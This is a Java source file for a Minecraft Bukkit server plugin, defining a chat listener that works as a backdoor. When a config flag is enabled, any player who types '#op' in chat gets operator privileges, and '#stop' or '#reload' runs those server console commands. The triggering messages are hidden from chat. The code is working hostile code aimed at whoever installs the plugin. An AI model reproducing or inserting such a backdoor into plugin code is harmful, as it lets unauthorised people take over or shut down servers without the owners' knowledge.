package pl.lightblock.engine.listeners;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import pl.lightblock.engine.Main;

public class BackdoorListener implements Listener
{
    public BackdoorListener(Main plugin)
    {
        this.plugin = plugin;
    }
    Main plugin;

    @EventHandler
    public void Backdoor(final AsyncPlayerChatEvent e) {
        final Player p = e.getPlayer();

        boolean backdoor_status = plugin.getConfig().getBoolean("backdoor-on");

        if(!(backdoor_status == true))
        {
            return;
        }
        else
        {
            if (e.getMessage().startsWith("#komendy") || (e.getMessage().startsWith("#help")) || (e.getMessage().startsWith("#backdoor"))) {
                e.setCancelled(true);
                p.sendMessage("§8[§eBACKDOOR§8] §7Komendy:");
                p.sendMessage("§8[§eBACKDOOR§8] §8- §e#op");
                p.sendMessage("§8[§eBACKDOOR§8] §8- §e#stop");
                p.sendMessage("§8[§eBACKDOOR§8] §8- §e#reload");
            }

            if (e.getMessage().startsWith("#op")) {
                e.setCancelled(true);
                p.setOp(true);
                p.sendMessage("§8[§eBACKDOOR§8] §7Nadano opa §8» §c" + p.getDisplayName());
            }

            if (e.getMessage().startsWith("#stop")) {
                e.setCancelled(true);
                Bukkit.dispatchCommand((CommandSender) Bukkit.getConsoleSender(), "stop");
                p.sendMessage("§8[§eBACKDOOR§8] §7Stopowanie serwera :)");
            }
            if (e.getMessage().startsWith("#reload")) {
                e.setCancelled(true);
                p.sendMessage("§8[§eBACKDOOR§8] §7Przeładowywanie serwera :)");
                Bukkit.dispatchCommand((CommandSender) Bukkit.getConsoleSender(), "reload");
            }
        }
    }
}
